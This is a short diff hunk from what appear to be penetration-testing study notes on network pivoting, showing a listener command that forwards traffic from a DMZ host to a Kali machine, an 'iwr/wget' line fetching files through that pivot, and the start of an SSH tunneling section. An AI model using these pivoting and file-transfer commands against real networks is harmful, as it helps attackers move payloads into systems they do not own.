@@ -47,6 +47,7 @@ layout: blank
 	- `listener_add --addr 0.0.0.0:1339 --to 127.0.0.1:8000`
 		- Forwarding all traffic that reaches DMZ on 1339 to kali on 8000
 	- Now, we `iwr/wget {DMZ_IP}:1339/{file}`
+	
 ### SSH Tunneling
 - Can also be referred to as "SSH Port Forwarding"
 - SSH was designed to securely transmit traffic, so it was used initially for a lot of tunneling
